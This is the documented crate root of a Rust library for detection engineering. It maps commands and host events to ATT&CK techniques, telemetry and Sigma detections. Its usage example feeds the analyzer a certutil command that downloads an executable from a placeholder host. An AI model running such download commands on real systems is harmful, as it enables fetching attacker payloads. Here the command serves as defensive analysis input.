//! The knowledge base and evaluator behind [opseclint], as a library.
//!
//! Given a command, a script, or a recorded host event, this crate answers
//! three questions: which ATT&CK technique(s) the action implements, what host
//! telemetry it emits, and which detections would fire. It is the substrate
//! opseclint's binary is built on, published so other tools — a SIEM enrichment
//! step, a notebook, an MCP server, an agent — can build on the same data
//! rather than fork it.
//!
//! # The shape of an analysis
//!
//! ```
//! use opseclint_core::{analyzer, kb, kb::Platform};
//!
//! let kb = kb::load(Platform::WindowsSysmon)?;
//! let report = analyzer::analyze("certutil -urlcache -f http://x/a.exe a.exe", &kb);
//!
//! for finding in &report.findings {
//!     println!("{} — {}", finding.rule_id, finding.description);
//!     for t in &finding.techniques {
//!         println!("  {} {}", t.id, t.name);
//!     }
//!     for signal in &finding.telemetry {
//!         println!("  emits: {signal}");
//!     }
//! }
//! # Ok::<(), opseclint_core::KbError>(())
//! ```
//!
//! [`sigma`] enriches that report from a real SigmaHQ checkout, and
//! [`telemetry`] takes the other direction — recorded sensor events in, the
//! same [`Report`] out.
//!
//! # Uncertainty is a value, not an absence
//!
//! [`sigma_eval`] is three-valued on purpose. A command line is not a host
//! event, so a rule keyed on a field the input cannot carry — `ParentImage`, a
//! hash, a registry value — evaluates to [`Outcome::Indeterminate`], never to
//! "no". Treat that verdict as its own answer: rounding it to *not detected* is
//! the one misuse of this crate that turns a careful result into a false claim
//! of stealth. Absence of a finding is not evidence of stealth either — the
//! knowledge base models a bounded set of actions, and [`kb::load`] tells you
//! which platform you asked about, not that the platform is fully mapped.
//!
//! [`Outcome::Indeterminate`]: sigma_eval::Outcome::Indeterminate
//! [opseclint]: https://github.com/ezekiellabs/opseclint
//!
//! # Feature flags
//!
//! - `clap` — derive `clap::ValueEnum` on [`kb::Platform`],
//!   [`telemetry::Format`], and [`edr::Vendor`], for consumers that accept them
//!   as command-line flag values. Off by default.

// Every public item carries documentation, and CI fails the build if one does
// not. This is a knowledge-base crate: a field named `noise` or a verdict named
// `Indeterminate` means something specific, and a consumer who guesses at the
// meaning gets a plausible wrong answer rather than an error.
#![warn(missing_docs)]

pub mod analyzer;
pub mod edr;
pub mod kb;
pub mod matcher;
pub mod model;
pub mod parser;
pub mod sigma;
pub mod sigma_eval;
pub mod telemetry;

// The names a consumer reaches for first. Everything else stays behind its
// module, where the module docs explain it.
pub use kb::{KbError, Platform};
pub use model::{
    Detection, EdrMapping, Finding, KbEntry, KnowledgeBase, Report, Severity, SideEffect, Technique,
};
pub use parser::Command;
pub use sigma_eval::{Outcome, Verdict};
